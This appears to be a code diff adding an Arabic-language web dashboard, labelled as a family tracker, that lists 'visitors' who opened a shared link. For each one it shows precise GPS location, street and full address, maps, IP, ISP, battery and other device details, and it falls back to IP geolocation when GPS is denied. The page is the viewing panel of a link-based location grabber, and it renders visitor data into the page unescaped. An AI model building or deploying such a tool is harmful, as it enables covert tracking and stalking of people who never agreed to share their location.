@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدارة الأجهزة - متتبع العائلة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0a0a1a, #1a1a3e, #0d0d2b);
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .dashboard-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+        }
+
+        .dashboard-header h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00d2ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
+        }
+
+        .dashboard-header p {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+        }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 16px;
+            margin-bottom: 30px;
+            max-width: 1100px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            border-color: rgba(0, 210, 255, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .stat-card .number {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00d2ff, #7b2ff7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stat-card .label {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        /* Device Cards */
+        .devices-list {
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .device-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 20px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .device-card:hover {
+            border-color: rgba(0, 210, 255, 0.2);
+        }
+
+        /* Device Header */
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .device-identity {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .device-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #00d2ff, #7b2ff7);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+
+        .device-name {
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .device-meta {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+
+        .device-badge {
+            background: rgba(0, 210, 255, 0.1);
+            border: 1px solid rgba(0, 210, 255, 0.3);
+            color: #00d2ff;
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Location Section */
+        .location-section {
+            padding: 20px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00d2ff;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .location-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .location-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            background: rgba(0, 210, 255, 0.04);
+            border: 1px solid rgba(0, 210, 255, 0.08);
+            border-radius: 12px;
+        }
+
+        .location-item .loc-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .location-item .loc-label {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+
+        .location-item .loc-value {
+            color: #fff;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .full-address {
+            grid-column: 1 / -1;
+            padding: 12px 14px;
+            background: rgba(0, 210, 255, 0.04);
+            border: 1px solid rgba(0, 210, 255, 0.08);
+            border-radius: 12px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.5;
+        }
+
+        .map-link {
+            grid-column: 1 / -1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            background: linear-gradient(135deg, rgba(0, 210, 255, 0.1), rgba(123, 47, 247, 0.1));
+            border: 1px solid rgba(0, 210, 255, 0.2);
+            border-radius: 12px;
+            color: #00d2ff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .map-link:hover {
+            background: linear-gradient(135deg, rgba(0, 210, 255, 0.2), rgba(123, 47, 247, 0.2));
+            transform: translateY(-1px);
+        }
+
+        /* Map embed */
+        .map-container {
+            grid-column: 1 / -1;
+            border-radius: 12px;
+            overflow: hidden;
+            height: 200px;
+            border: 1px solid rgba(0, 210, 255, 0.15);
+        }
+
+        .map-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* IP Location (fallback) */
+        .ip-location {
+            padding: 14px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .ip-tag {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 6px 12px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .ip-tag .tag-icon {
+            margin-left: 6px;
+        }
+
+        /* Device Info Section */
+        .info-section {
+            padding: 20px 24px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 10px;
+        }
+
+        .info-chip {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 14px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            font-size: 13px;
+        }
+
+        .info-chip .chip-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .info-chip .chip-label {
+            color: rgba(255, 255, 255, 0.35);
+            font-size: 11px;
+        }
+
+        .info-chip .chip-value {
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 600;
+        }
+
+        /* GPS denied notice */
+        .gps-denied {
+            padding: 12px 14px;
+            background: rgba(255, 165, 0, 0.08);
+            border: 1px solid rgba(255, 165, 0, 0.2);
+            border-radius: 12px;
+            color: rgba(255, 165, 0, 0.8);
+            font-size: 12px;
+            text-align: center;
+            grid-column: 1 / -1;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 80px 20px;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .empty-state .emoji {
+            font-size: 70px;
+            margin-bottom: 20px;
+        }
+
+        .refresh-btn {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            background: linear-gradient(135deg, #00d2ff, #7b2ff7);
+            color: white;
+            border: none;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            font-size: 22px;
+            cursor: pointer;
+            box-shadow: 0 4px 25px rgba(0, 210, 255, 0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .refresh-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 35px rgba(0, 210, 255, 0.5);
+        }
+
+        .refresh-btn.spinning {
+            animation: spin 0.8s ease;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+
+            .location-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .dashboard-header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="dashboard-header">
+        <h1>📍 إدارة الأجهزة</h1>
+        <p>تتبع الأجهزة العائلية — الموقع ومعلومات الجهاز</p>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <div class="number" id="totalVisitors">0</div>
+            <div class="label">إجمالي الأجهزة</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="uniqueCountries">0</div>
+            <div class="label">المواقع</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="mobileCount">0</div>
+            <div class="label">أجهزة موبايل</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="gpsCount">0</div>
+            <div class="label">مواقع GPS دقيقة</div>
+        </div>
+    </div>
+
+    <div class="devices-list" id="devicesList">
+        <div class="empty-state">
+            <div class="emoji">📡</div>
+            <h3>لا توجد أجهزة متصلة حتى الآن</h3>
+            <p>شارك الرابط وستظهر الأجهزة هنا</p>
+        </div>
+    </div>
+
+    <button class="refresh-btn" onclick="loadDevices()" title="تحديث">🔄</button>
+
+    <script>
+        async function loadDevices() {
+            const btn = document.querySelector('.refresh-btn');
+            btn.classList.add('spinning');
+
+            try {
+                const response = await fetch('/api/visitors');
+                const devices = await response.json();
+
+                document.getElementById('totalVisitors').textContent = devices.length;
+
+                const countries = new Set(devices.map(v =>
+                    v.gpsLocation?.country || v.ipInfo?.country
+                ).filter(Boolean));
+                document.getElementById('uniqueCountries').textContent = countries.size;
+
+                const mobileCount = devices.filter(v => v.device?.isMobile).length;
+                document.getElementById('mobileCount').textContent = mobileCount;
+
+                const gpsCount = devices.filter(v => v.gpsLocation?.lat).length;
+                document.getElementById('gpsCount').textContent = gpsCount;
+
+                const list = document.getElementById('devicesList');
+
+                if (devices.length === 0) {
+                    list.innerHTML = `
+                        <div class="empty-state">
+                            <div class="emoji">📡</div>
+                            <h3>لا توجد أجهزة متصلة حتى الآن</h3>
+                            <p>شارك الرابط وستظهر الأجهزة هنا</p>
+                        </div>`;
+                    return;
+                }
+
+                list.innerHTML = devices.reverse().map((v, i) => {
+                    const time = new Date(v.timestamp).toLocaleString('ar-EG');
+                    const deviceIcon = v.device?.isMobile ? '📱' : '💻';
+                    const deviceType = v.device?.isMobile ? 'موبايل' : 'كمبيوتر';
+                    const deviceName = `${v.device?.os || v.device?.platform || '?'} — ${v.device?.browser || '?'}`;
+                    const hasGPS = v.gpsLocation && v.gpsLocation.lat;
+                    const city = (hasGPS ? v.gpsLocation.city : v.ipInfo?.city) || '?';
+
+                    // GPS Location section
+                    let locationHTML = '';
+                    if (hasGPS) {
+                        locationHTML = `
+                        <div class="location-section">
+                            <div class="section-title">🎯 الموقع الدقيق (GPS)</div>
+                            <div class="location-grid">
+                                <div class="location-item">
+                                    <span class="loc-icon">📍</span>
+                                    <div><div class="loc-label">المدينة</div><div class="loc-value">${v.gpsLocation.city || '?'}</div></div>
+                                </div>
+                                ${v.gpsLocation.district ? `
+                                <div class="location-item">
+                                    <span class="loc-icon">🏘️</span>
+                                    <div><div class="loc-label">الحي</div><div class="loc-value">${v.gpsLocation.district}</div></div>
+                                </div>` : ''}
+                                ${v.gpsLocation.road ? `
+                                <div class="location-item">
+                                    <span class="loc-icon">🛣️</span>
+                                    <div><div class="loc-label">الشارع</div><div class="loc-value">${v.gpsLocation.road}</div></div>
+                                </div>` : ''}
+                                ${v.gpsLocation.state ? `
+                                <div class="location-item">
+                                    <span class="loc-icon">🗺️</span>
+                                    <div><div class="loc-label">المحافظة</div><div class="loc-value">${v.gpsLocation.state}</div></div>
+                                </div>` : ''}
+                                <div class="location-item">
+                                    <span class="loc-icon">🌍</span>
+                                    <div><div class="loc-label">الدولة</div><div class="loc-value">${v.gpsLocation.country || '?'}</div></div>
+                                </div>
+                                <div class="location-item">
+                                    <span class="loc-icon">🎯</span>
+                                    <div><div class="loc-label">الدقة</div><div class="loc-value">${v.gpsLocation.accuracy || '?'}</div></div>
+                                </div>
+                                ${v.gpsLocation.fullAddress ? `
+                                <div class="full-address">
+                                    🏠 <strong>العنوان الكامل:</strong> ${v.gpsLocation.fullAddress}
+                                </div>` : ''}
+                                <div class="map-container">
+                                    <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${v.gpsLocation.lon - 0.01}%2C${v.gpsLocation.lat - 0.01}%2C${v.gpsLocation.lon + 0.01}%2C${v.gpsLocation.lat + 0.01}&layer=mapnik&marker=${v.gpsLocation.lat}%2C${v.gpsLocation.lon}" loading="lazy"></iframe>
+                                </div>
+                                <a class="map-link" href="https://www.google.com/maps?q=${v.gpsLocation.lat},${v.gpsLocation.lon}" target="_blank">
+                                    🗺️ فتح في خرائط Google
+                                </a>
+                            </div>
+                        </div>`;
+                    } else if (v.gpsLocation?.status === 'denied_or_unavailable') {
+                        locationHTML = `
+                        <div class="location-section">
+                            <div class="section-title">📍 الموقع</div>
+                            <div class="location-grid">
+                                <div class="gps-denied">⚠️ GPS مرفوض أو غير متاح — يتم استخدام موقع IP التقريبي</div>
+                                <div class="location-item">
+                                    <span class="loc-icon">🏙️</span>
+                                    <div><div class="loc-label">المدينة (تقريبي)</div><div class="loc-value">${v.ipInfo?.city || '?'}</div></div>
+                                </div>
+                                <div class="location-item">
+                                    <span class="loc-icon">🌍</span>
+                                    <div><div class="loc-label">الدولة</div><div class="loc-value">${v.ipInfo?.country || '?'}</div></div>
+                                </div>
+                                ${v.ipInfo?.lat ? `
+                                <a class="map-link" href="https://www.google.com/maps?q=${v.ipInfo.lat},${v.ipInfo.lon}" target="_blank">
+                                    🗺️ فتح في خرائط Google (تقريبي)
+                                </a>` : ''}
+                            </div>
+                        </div>`;
+                    } else if (v.ipInfo) {
+                        locationHTML = `
+                        <div class="location-section">
+                            <div class="section-title">📍 الموقع (IP تقريبي)</div>
+                            <div class="location-grid">
+                                <div class="location-item">
+                                    <span class="loc-icon">🏙️</span>
+                                    <div><div class="loc-label">المدينة</div><div class="loc-value">${v.ipInfo.city || '?'}</div></div>
+                                </div>
+                                <div class="location-item">
+                                    <span class="loc-icon">🌍</span>
+                                    <div><div class="loc-label">الدولة</div><div class="loc-value">${v.ipInfo.country || '?'}</div></div>
+                                </div>
+                            </div>
+                        </div>`;
+                    }
+
+                    return `
+                    <div class="device-card">
+                        <div class="device-header">
+                            <div class="device-identity">
+                                <div class="device-icon">${deviceIcon}</div>
+                                <div>
+                                    <div class="device-name">${deviceName}</div>
+                                    <div class="device-meta">${time} • ${city}</div>
+                                </div>
+                            </div>
+                            <div class="device-badge">${hasGPS ? '🎯 GPS دقيق' : '📡 IP تقريبي'}</div>
+                        </div>
+
+                        ${locationHTML}
+
+                        <div class="ip-location">
+                            <div class="ip-tag"><span class="tag-icon">🌐</span> IP: ${v.ip || '?'}</div>
+                            <div class="ip-tag"><span class="tag-icon">🏢</span> ${v.ipInfo?.isp || '?'}</div>
+                            <div class="ip-tag"><span class="tag-icon">⏰</span> ${v.ipInfo?.timezone || '?'}</div>
+                        </div>
+
+                        <div class="info-section">
+                            <div class="section-title">📱 معلومات الجهاز</div>
+                            <div class="info-grid">
+                                <div class="info-chip"><span class="chip-icon">💻</span><div><div class="chip-label">النظام</div><div class="chip-value">${v.device?.platform || '?'}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">🌐</span><div><div class="chip-label">المتصفح</div><div class="chip-value">${v.device?.browser || '?'}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">📐</span><div><div class="chip-label">الشاشة</div><div class="chip-value">${v.device?.screenWidth}x${v.device?.screenHeight}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">🔋</span><div><div class="chip-label">البطارية</div><div class="chip-value">${v.device?.battery || '?'}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">📶</span><div><div class="chip-label">الاتصال</div><div class="chip-value">${v.device?.connection || '?'}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">📱</span><div><div class="chip-label">النوع</div><div class="chip-value">${deviceType}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">🗣️</span><div><div class="chip-label">اللغة</div><div class="chip-value">${v.device?.language || '?'}</div></div></div>
+                                <div class="info-chip"><span class="chip-icon">🔲</span><div><div class="chip-label">الأنوية</div><div class="chip-value">${v.device?.cores || '?'}</div></div></div>
+                            </div>
+                        </div>
+                    </div>`;
+                }).join('');
+            } catch (e) {
+                console.error('Error loading devices:', e);
+            }
+
+            setTimeout(() => btn.classList.remove('spinning'), 800);
+        }
+
+        loadDevices();
+        setInterval(loadDevices, 15000);
+    </script>
+</body>
+
+</html>
